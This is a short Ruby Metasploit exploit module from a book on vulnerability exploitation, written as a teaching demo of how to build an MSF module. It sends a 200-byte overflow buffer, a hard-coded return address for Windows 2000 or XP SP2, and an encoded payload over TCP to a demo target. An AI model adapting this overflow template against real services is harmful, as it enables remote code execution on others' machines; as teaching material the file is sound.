#/*****************************************************************************
#      To be the apostrophe which changed "Impossible" into "I'm possible"!
#		
#POC code of chapter 4 in book "Vulnerability Exploit and Analysis Technique"
# 
#file name	: test.rb
#author		: failwest  
#date		: 2007.4.4
#description	: used as a demo to show how to implemented exploit module of MSF 
#Noticed	: create a sub directory named "failwest" in the exploit directory
#		  of MSF 3.0. For example, the default directory of exploit is 
#		  "C:\Program Files\Metasploit\Framework3\framework\modules\exploits"
#		  this module should be put into
#		  "C:\Program Files\Metasploit\Framework3\framework\modules\exploits\failwest\"
#version	: 1.0
#E-mail		: failwest@gmail.com
#		
#	Only for educational purposes    enjoy the fun from exploiting :)
#******************************************************************************/
require 'msf/core'
module Msf
class Exploits::Failwest::Test < Msf::Exploit::Remote
include Exploit::Remote::Tcp
	
	def initialize(info = {})
	    super(update_info(info,
		'Name'		=> 'failwest_test',
		'Platform'	=> 'win',
		'Targets'	=> [
					['Windows 2000',  {'Ret' => 0x77F8948B } ], 
					['Windows XP SP2',{'Ret' => 0x7C914393 } ]
				   ],
		'Payload'       => {
					'Space'    => 200,
					'BadChars' => "\x00",
				    }
		))
	end #end of initialize

	def exploit
		connect
		attack_buf = 'a'*200 + [target['Ret']].pack('V') + payload.encoded
		sock.put(attack_buf)	
		handler
		disconnect
	end  #end of exploit def
end #end of class def
end #end of module def